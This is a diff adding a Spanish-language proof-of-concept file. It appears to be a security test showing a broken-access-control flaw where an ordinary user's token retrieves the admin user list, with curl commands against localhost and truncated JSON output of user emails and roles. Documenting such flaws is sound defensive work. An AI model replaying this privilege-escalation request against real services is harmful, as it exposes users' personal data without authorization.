@@ -1,0 +1,46 @@
+################################################################
+# PoC A01:2021 - BROKEN ACCESS CONTROL (escalada vertical)
+# Endpoint: GET /api/admin/users   |   Estado: VULNERABLE
+################################################################
+
+## Contexto: 'victima' (id=13) tiene rol 'user', NO es administrador.
+
+## Paso 1. Sin credenciales -> el endpoint exige sesion (401)
+$ curl -i 'http://localhost:3000/api/admin/users'
+   << HTTP 401 >>
+
+## Paso 2. Con token de usuario NORMAL -> accede al panel de administracion
+$ curl 'http://localhost:3000/api/admin/users' -H 'Authorization: Token <token-de-victima>'
+{
+    "users": [
+        {
+            "id": 1,
+            "email": "francisco-javier+wafula336@qq.dev",
+            "username": "Eliyahu Jim\u00e9nez",
+            "role": "admin"
+        },
+        {
+            "id": 2,
+            "email": "willemyoshida@libero.name",
+            "username": "Yuval R\u00edos",
+            "role": "user"
+        },
+        {
+            "id": 3,
+            "email": "xiaohong.nyambura938@msn.io",
+            "username": "Mary Sanz",
+            "role": "user"
+        },
+        {
+            "id": 4,
+            "email": "kseniya+cohen885@ntlworld.com",
+            "username": "Francis Bowen",
+            "role": "user"
+        },
+        {
+            "id": 5,
+            "email": "elisabeth_barasa325@gmx.info",
+            "username": "Johannes \u017dukauskien\u0117",
+
+## Resultado: cualquier usuario autenticado lee el listado completo
+## de usuarios y sus roles. No se valida el rol del solicitante.
